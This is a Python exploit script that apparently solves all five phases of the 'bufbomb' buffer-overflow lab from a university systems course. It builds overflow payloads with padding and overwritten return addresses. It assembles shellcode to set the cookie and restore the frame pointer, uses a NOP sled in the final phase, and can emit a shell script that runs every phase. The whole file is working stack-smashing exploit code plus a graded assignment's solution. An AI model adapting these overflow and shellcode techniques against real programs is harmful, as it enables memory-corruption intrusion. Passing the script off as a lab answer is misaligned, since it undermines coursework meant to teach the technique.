#!/usr/bin/env python

import struct
import threading
import os
import sys
from pwnlib.elf import ELF
import thread

bufbomb = ELF("bufbomb")

# USERNAME = "zhan4854"
USERNAME = raw_input()

runCode = " | ./bufbomb -u {}".format(USERNAME)


def get_shellcode(asm):
    tmpfile = "/tmp/asm.S"
    with open(tmpfile, "w") as f:
        f.write(asm)
    os.popen("gcc -m32 -c %s -o /tmp/asm" % tmpfile).read()
    return eval(os.popen("""for i in `objdump -d /tmp/asm | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' `; do echo -n "\\x$i" ; done | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'""").read())


def format(string):
    return " ".join(c.encode("hex") for c in string)


def exploit(string):
    return "echo '%s' | ./hex2raw" % format(string)


def cookie(string):
    return eval(os.popen("./makecookie %s" % string).read())

cookie = cookie(USERNAME)


def phase_0(run=False):
    smoke = bufbomb.symbols["smoke"]
    return exploit("A" * 44 + struct.pack("<I", smoke)) + (runCode if run else "")


def phase_1(run=False):
    fizz = bufbomb.symbols["fizz"]
    return exploit("A" * 44 + struct.pack("<I", fizz) + "A" * 4 + struct.pack("<I", cookie)) + (runCode if run else "")


def phase_2(run=False):
    global_value = bufbomb.symbols["global_value"]
    bang = bufbomb.symbols["bang"]
    bang_shellcode = 0x55682ff4
    assembly = """
    .intel_syntax
        push {bang}
        mov DWORD PTR [{global_value}], {cookie}
        ret
    """.format(bang=bang, cookie=cookie, global_value=global_value)
    shellcode = get_shellcode(assembly)
    return exploit("A" * (44 - len(shellcode)) + shellcode + struct.pack("<I", bang_shellcode)) + (runCode if run else "")


def phase_3(run=False):
    return_to = 0x08048dec
    canary = 0x55683020
    assembly = """
    .intel_syntax
        mov %ebp, {canary}
        push {return_to}
        mov %eax, {cookie}
        ret
    """.format(canary=canary, cookie=cookie, return_to=return_to)
    p3_shellcode = 0x55682ff4
    shellcode = get_shellcode(assembly)
    return exploit("A" * (44 - len(shellcode)) + shellcode + struct.pack("<I", p3_shellcode)) + (runCode if run else "")


def phase_4(run=False):
    return_to = 0x08048e5d
    canary = 0x55683020
    assembly = """
    .intel_syntax
        lea %ebp, [%esp + 0x18]
        push {return_to}
        mov %eax, {cookie}
        ret
    """.format(canary=canary, cookie=cookie, return_to=return_to)
    p4_shellcode = 0x55682e18
    shellcode = get_shellcode(assembly)
    return exploit("\x90" * (524 - len(shellcode)) + shellcode + struct.pack("<I", p4_shellcode)) + " -n" + (runCode + " -n" if run else "")


def main():
    if len(sys.argv) < 2:
        print "Usage: %s [phase]" % sys.argv[0]
        sys.exit(1)
    phases = [phase_0, phase_1, phase_2, phase_3, phase_4]
    if sys.argv[1] == "all":
        code = ["#!/bin/sh",
                "set -e"] + [f(run=True) for f in phases]
        print "\n".join(code)
        sys.exit(0)
    phase = int(sys.argv[1])
    print phases[phase]()
    sys.exit(0)


if __name__ == "__main__":
    main()
